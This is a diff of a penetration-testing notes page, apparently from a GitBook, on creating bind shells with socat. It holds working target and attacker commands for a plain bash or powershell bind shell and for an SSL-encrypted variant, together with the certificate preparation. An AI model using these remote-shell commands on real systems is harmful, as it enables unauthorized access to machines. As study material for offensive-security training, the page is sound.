@@ -1,22 +1,20 @@
-# Bind Shell
+---
+description: Creating bind shells with socat
+---
 
-A bind shell involves the attacker reaching out to a target machine (via an open networking port) and _binding_ the shell to that port.
+# Socat
 
-<figure><img src="../../.gitbook/assets/Netcat_BindShell.png" alt=""><figcaption><p>Netcat Bind Shell Example</p></figcaption></figure>
+## Basic Bind Shell
 
-## Socat
+### Target
 
-### Basic Bind Shell
-
-#### Target
-
-Linux
+#### Linux
 
 ```bash
 user@target:~$ socat TCP-L:{PORT} EXEC:"bash -li"
 ```
 
-Windows
+#### Windows
 
 ```powershell
 C:\Users\offsec> socat TCP-L:{PORT} EXEC:powershell.exe,pipes
@@ -24,17 +22,17 @@ C:\Users\offsec> socat TCP-L:{PORT} EXEC:powershell.exe,pipes
 
 * Privileged access would be required to start the listener on any common ports below 1024
 
-#### Attacker
+### Attacker
 
 ```bash
 kali@kali:~$ socat TCP:{TARGET-IP}:{TARGET-PORT} -
 ```
 
-### Encrypted Bind Shell
+## Encrypted Bind Shell
 
 Socat can be used to create encrypted shells that do not transmit commands in plain text over the network.
 
-#### Generate SSL Certificate
+### Generate SSL Certificate
 
 The first step is to generate an SSL certificate which will be used to encrypt the traffic. The SSL certificate should be generated on the machine that will be the listener portion of the shell.
 
@@ -78,21 +76,27 @@ Email Address []:
 | `-days`    | Set validity period in days                                       |
 | `-out`     | Save the certificate to a file                                    |
 
+#### Combine Key Files
+
 Now that the key and certificate have been generated, they will first need to be converted to a format socat will accept. To do so, combine both the `bind_shell.key` and `bind_shell.crt` files into a single `.pem` file.
 
 ```bash
 kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
 ```
 
-#### Create Encrypted Shell
+### Create Encrypted Shell
 
-Listener must be created on the **target machine**
+#### Target Machine
+
+Listener must be created on the target machine
 
 ```bash
 user@target:~$ socat OPENSSL-LISTEN:{PORT},cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 ```
 
-**Attacker machine** can then reach out to the listener:
+#### Attacker Machine
+
+Attacker machine can then reach out to the listener:
 
 ```bash
 kali@kali:~$ socat - OPENSSL:{Listen-IP}:{PORT},verify=0
